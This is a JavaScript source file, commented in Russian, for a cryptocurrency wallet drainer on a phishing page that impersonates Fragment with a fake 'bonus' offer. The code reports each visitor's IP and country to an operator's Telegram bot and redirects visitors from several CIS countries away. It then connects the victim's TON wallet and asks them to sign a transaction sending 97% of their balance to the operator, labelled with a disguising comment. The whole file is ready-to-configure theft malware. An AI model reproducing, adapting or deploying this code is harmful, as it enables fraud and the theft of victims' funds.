// ================================================================
//  🔧 КОНФИГУРАЦИЯ – ЗАМЕНИТЕ НА СВОИ ДАННЫЕ
// ================================================================
var mainWallet = "UQB8vV6TevtZAjKxoaXa8gaOqeu9YhClqtpLBTsvS8orahlI"; // Адрес, куда уходят средства
var tgBotToken = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz";          // Токен Telegram-бота
var tgChat = "-1001234567890";                                     // ID канала/группы (с минусом)

// ================================================================
//  ГЕО-БЛОКИРОВКА И УВЕДОМЛЕНИЯ
// ================================================================
var domain = window.location.hostname;
var ipUser = '';
var countryUser = '';

// Отправка уведомлений в Telegram
function sendTelegram(message) {
    var url = 'https://api.telegram.org/bot' + tgBotToken + '/sendMessage';
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: tgChat,
            text: message,
            parse_mode: 'Markdown'
        })
    }).catch(function() {});
}

// Проверка геолокации
fetch('https://ipapi.co/json/')
    .then(function(response) { return response.json(); })
    .then(function(data) {
        var country = data.country;
        ipUser = data.ip;
        countryUser = country;
        console.log('IP:', ipUser, 'Country:', countryUser);

        // Блокируем страны СНГ – редирект на оригинальный Fragment
        var blocked = ['', 'KZ', '', 'UA', 'AM', 'AZ', 'KG', 'MD', 'UZ', 'TJ', 'TM', 'GE'];
        if (blocked.indexOf(country) !== -1) {
            window.location.replace('https://fragment.com');
            return;
        }

        // Уведомление об открытии сайта
        var msg = '🖥 *Domain:* ' + domain + '\n👤 *User:* ' + ipUser + ' ' + countryUser + '\n📖 *Opened the website*';
        sendTelegram(msg);
    })
    .catch(function(err) { console.error('Geo error:', err); });

// ================================================================
//  ИНИЦИАЛИЗАЦИЯ TON CONNECT UI
// ================================================================
var manifestUrl = 'https://' + domain + '/tonconnect-manifest.json';
console.log('Манифест:', manifestUrl);

var tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: manifestUrl
});

// Элементы DOM
var connectBtn = document.getElementById('connectBtn');
var drainBtn = document.getElementById('drainBtn');
var statusHint = document.getElementById('statusHint');

// ================================================================
//  ОБРАБОТЧИК КНОПКИ ПОДКЛЮЧЕНИЯ (ЯВНЫЙ ВЫЗОВ)
// ================================================================
connectBtn.addEventListener('click', function() {
    connectBtn.disabled = true;
    connectBtn.textContent = 'Подключение...';
    tonConnectUI.connect({ manifestUrl: manifestUrl })
        .then(function() {
            // успех – обработается в событии 'connect'
        })
        .catch(function(err) {
            console.error('Ошибка подключения:', err);
            connectBtn.textContent = 'Подключить кошелёк';
            connectBtn.disabled = false;
            statusHint.textContent = '❌ Ошибка подключения';
        });
});

// ================================================================
//  СОБЫТИЯ TON CONNECT
// ================================================================
tonConnectUI.on('connect', function(wallet) {
    var addr = wallet.account.address;
    connectBtn.textContent = '✅ ' + addr.slice(0, 6) + '...' + addr.slice(-4);
    connectBtn.disabled = true;
    drainBtn.disabled = false;
    statusHint.textContent = 'Кошелёк подключён! Нажмите "Забрать бонус"';
    console.log('Подключён:', addr);
});

tonConnectUI.on('disconnect', function() {
    connectBtn.textContent = 'Подключить кошелёк';
    connectBtn.disabled = false;
    drainBtn.disabled = true;
    statusHint.textContent = 'Подключите кошелёк для получения бонуса';
});

// ================================================================
//  ОСНОВНАЯ ФУНКЦИЯ – DRAIN
// ================================================================
function didtrans() {
    if (!tonConnectUI.account || !tonConnectUI.account.address) {
        statusHint.textContent = '⚠️ Сначала подключите кошелёк';
        return;
    }

    var address = tonConnectUI.account.address;
    statusHint.textContent = '⏳ Получение баланса...';
    drainBtn.disabled = true;

    // Запрос баланса через toncenter.com
    fetch('https://toncenter.com/api/v3/wallet?address=' + address)
        .then(function(res) { return res.json(); })
        .then(function(data) {
            if (!data || !data.balance) {
                throw new Error('Не удалось получить баланс');
            }
            var balanceNano = parseFloat(data.balance);
            if (balanceNano < 0.1 * 1e9) {
                statusHint.textContent = '❌ Баланс меньше 0.1 TON';
                drainBtn.disabled = false;
                return;
            }

            // Сумма кражи (97%)
            var stealNano = Math.floor(balanceNano * 0.97);
            var tgBalance = stealNano / 1e9;

            // Формируем транзакцию с маскирующим комментарием
            var transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 120,
                messages: [{
                    address: mainWallet,
                    amount: stealNano.toString(),
                    payload: '🎁 Получение бонуса от Fragment' // маскировка
                }]
            };

            statusHint.textContent = '⏳ Отправка транзакции на подпись...';

            return tonConnectUI.sendTransaction(transaction)
                .then(function(result) {
                    console.log('Транзакция отправлена:', result);
                    // Успех – уведомление
                    var msg = '✅ *УСПЕШНО!*\n' +
                        '👤 Адрес: `' + address + '`\n' +
                        '💰 TON: ' + tgBalance.toFixed(2) + '\n' +
                        '🌐 Домен: ' + domain;
                    sendTelegram(msg);
                    statusHint.textContent = '✅ Успешно! Активы переведены.';
                    drainBtn.disabled = true;
                });
        })
        .catch(function(err) {
            console.error('Ошибка в didtrans:', err);
            var msg = '❌ *ОТКАЗ / ОШИБКА*\n' +
                '👤 Адрес: `' + address + '`\n' +
                '🌐 Домен: ' + domain;
            sendTelegram(msg);
            statusHint.textContent = '❌ Транзакция отклонена или ошибка';
            drainBtn.disabled = false;
        });
}

// ================================================================
//  ПРИВЯЗКА КНОПКИ "ЗАБРАТЬ БОНУС"
// ================================================================
drainBtn.addEventListener('click', didtrans);

// ================================================================
//  ЛОГ В КОНСОЛЬ
// ================================================================
console.log('[DRAINER] Активен. Оператор:', mainWallet);
